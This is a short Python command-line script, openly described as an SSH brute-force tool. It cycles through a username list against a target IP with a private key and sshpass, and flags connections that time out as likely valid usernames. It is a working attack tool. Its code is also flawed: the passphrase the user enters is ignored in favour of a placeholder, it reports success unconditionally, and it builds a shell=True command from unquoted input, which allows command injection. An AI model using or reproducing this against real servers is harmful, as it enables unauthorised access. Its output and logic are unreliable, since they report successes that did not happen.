#!/usr/bin/env python3

import subprocess
import click
import os
import threading

def check_private_key_permissions(private_key):
    # Get file permissions
    permissions = oct(os.stat(private_key).st_mode)[-3:]

    # Check if permissions are not set to 400
    if permissions != '400':
        print(f"Changing permissions of {private_key} to 400...")
        os.chmod(private_key, 0o400)

def timeout_handler(process, last_username, timeout_usernames):
    if process.poll() is None:
        process.kill()
        print("SSH connection timed out")
        print(f"Possible Correct Username Found, Username: {last_username}")
        timeout_usernames.append(last_username)

@click.command()
@click.option('--ip', prompt='Enter the IP address', help='IP address of the SSH server')
@click.option('--private-key', prompt='Enter the path to the private key file', help='Path to the private key file (e.g., id_rsa.key)')
@click.option('--user-list', prompt='Enter the path to the user list file', help='Path to the file containing a list of usernames')
@click.password_option(prompt='Enter the SSH private key passphrase', help='Passphrase for the SSH private key')
def main(ip, private_key, user_list, password):
    print("Starting SSH brute force...")
    print(f"IP: {ip}")
    print(f"Private Key: {private_key}")
    print(f"User List: {user_list}")

    timeout_usernames = []

    try:
        with open(user_list, "r") as file:
            last_username = None
            for line in file:
                username = line.strip()
                last_username = username
                print(f"Trying SSH authentication for {username}@{ip}...")
                ssh_attempt(username, ip, private_key, password, last_username, timeout_usernames)
    except Exception as e:
        print(f"An error occurred: {e}")

    # Print usernames that hit the time limit
    for username in timeout_usernames:
        print(f"\nPossible Correct Username Found, Username: {username}")

def ssh_attempt(username, ip_address, private_key_path, password, last_username, timeout_usernames):
    print("Inside ssh_attempt function...")
    
    command = ["ssh", "-i", private_key_path, f"{username}@{ip_address}"]
    sshpass_command = f'sshpass -p "######" ssh -i {private_key_path} {username}@{ip_address}'
    
    print(f"SSH command: {' '.join(command)}")
    print(f"sshpass command: {sshpass_command}")

    try:
        # Run the SSH command
        process = subprocess.Popen(sshpass_command, shell=True)
        
        # Start a timer for a timeout
        timer = threading.Timer(15, timeout_handler, [process, last_username, timeout_usernames])
        timer.start()

        # Wait for the SSH process to finish
        process.wait()
        timer.cancel()

        print(f"SSH authentication successful for {username}@{ip_address}")
    except subprocess.CalledProcessError as e:
        print(f"SSH authentication failed for {username}@{ip_address}: {e}")

if __name__ == "__main__":
    main()
